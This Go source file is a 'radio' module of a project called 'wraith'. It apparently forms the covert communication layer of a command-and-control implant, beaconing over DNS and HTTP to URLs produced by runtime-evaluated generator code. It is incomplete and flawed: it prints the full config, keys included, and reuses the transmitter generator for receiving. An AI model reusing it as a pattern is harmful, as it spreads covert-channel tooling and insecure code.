package radio

import (
	"fmt"
	"net/url"

	"github.com/TR-SLimey/wraith/config"
	"github.com/TR-SLimey/wraith/radio/frequencies"
	"github.com/traefik/yaegi/interp"
)

func NewRadio() Radio {
	r := Radio{
		Transmitter: Antenna{
			URLGenerator:         config.Config.Radio.Transmitter.URLGenerator,
			TriggerCheckInterval: config.Config.Radio.Transmitter.TriggerCheckInterval,
		},
		Receiver: Antenna{
			URLGenerator:         config.Config.Radio.Receiver.URLGenerator,
			TriggerCheckInterval: config.Config.Radio.Receiver.TriggerCheckInterval,
		},
		FrequencyMap: make(map[string]Frequency),
	}

	r.Transmitter.Crypto.Enabled = config.Config.Radio.Transmitter.Encryption.Enabled
	r.Transmitter.Crypto.Type = config.Config.Radio.Transmitter.Encryption.Type
	r.Transmitter.Crypto.Key = config.Config.Radio.Transmitter.Encryption.Key

	r.Receiver.Crypto.Enabled = config.Config.Radio.Receiver.Encryption.Enabled
	r.Receiver.Crypto.Type = config.Config.Radio.Receiver.Encryption.Type
	r.Receiver.Crypto.Key = config.Config.Radio.Receiver.Encryption.Key

	r.FrequencyMap["dns"] = frequencies.DNS{}
	r.FrequencyMap["http"] = frequencies.HTTP{}
	r.FrequencyMap["https"] = r.FrequencyMap["http"]

	r.TransmitQueue = make(chan []byte)
	r.ReceiveQueue = make(chan []byte)

	r.RunFlag = true

	return r
}

type Radio struct {
	Transmitter   Antenna
	Receiver      Antenna
	TransmitQueue chan []byte
	ReceiveQueue  chan []byte
	RunFlag       bool
	FrequencyMap  map[string]Frequency
}

type Antenna struct {
	URLGenerator         string
	Trigger              string
	TriggerCheckInterval int
	LastTimestamp        int
	LastURL              string
	Crypto               struct {
		Enabled bool
		Type    int
		Key     string
	}
	Verifier struct {
		Enabled bool
		Type    int
		Key     string
	}
}

type Frequency interface {
	Transmit(string, []byte) error
	Receive(string) ([]byte, error)
}

func (r *Radio) GenerateRadioURL(urltype int) (string, error) {
	var module Antenna
	if urltype == 0 {
		module = r.Transmitter
	} else if urltype == 1 {
		module = r.Receiver
	} else {
		return "", fmt.Errorf("invalid urltype")
	}
	// Use yaegi to run function to generate the next URL
	i := interp.New(interp.Options{})
	_, err := i.Eval(r.Transmitter.URLGenerator)
	fmt.Printf("# %v\n", config.Config)
	if err != nil {
		return "", err
	}
	v, err := i.Eval("gen.Gen")
	if err != nil {
		return "", err
	}
	gen := v.Interface().(func(string) string)
	result := gen(module.LastURL)
	// TODO: Check if result is valid URL
	return result, nil
}

func CheckCommsTrigger(commtype int) (bool, error) {
	return true, nil
}

func (r *Radio) Transmit() error {
	// Generate URL
	transmitAddr, err := r.GenerateRadioURL(0)
	if err != nil {
		return err
	}
	// Parse the URL for the protocol
	parsed, err := url.Parse(transmitAddr)
	if err != nil {
		return err
	}
	if freq, exists := r.FrequencyMap[parsed.Scheme]; exists {
		err := freq.Transmit(transmitAddr, []byte{})
		if err != nil {
			return err
		}
	} else {
		return fmt.Errorf("no frequency supports the scheme `%s`", parsed.Scheme)
	}
	return nil
}

func (r *Radio) Receive() error {
	// Generate URL
	receiveAddr, err := r.GenerateRadioURL(1)
	if err != nil {
		return err
	}
	// Parse the URL for the protocol
	parsed, err := url.Parse(receiveAddr)
	if err != nil {
		return err
	}
	if freq, exists := r.FrequencyMap[parsed.Scheme]; exists {
		_, err := freq.Receive(receiveAddr)
		if err != nil {
			return err
		}
	} else {
		return fmt.Errorf("no frequency supports the scheme `%s`", parsed.Scheme)
	}
	return nil
}

func (r *Radio) RunTransmit() {
	for r.RunFlag {
		r.Transmit()
	}
}

func (r *Radio) RunReceive() {
	for r.RunFlag {
		r.Receive()
	}
}
